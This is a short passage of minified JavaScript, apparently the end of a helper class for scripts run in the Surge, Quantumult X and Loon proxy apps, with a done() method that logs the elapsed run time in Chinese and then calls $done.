Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } }(t, e) }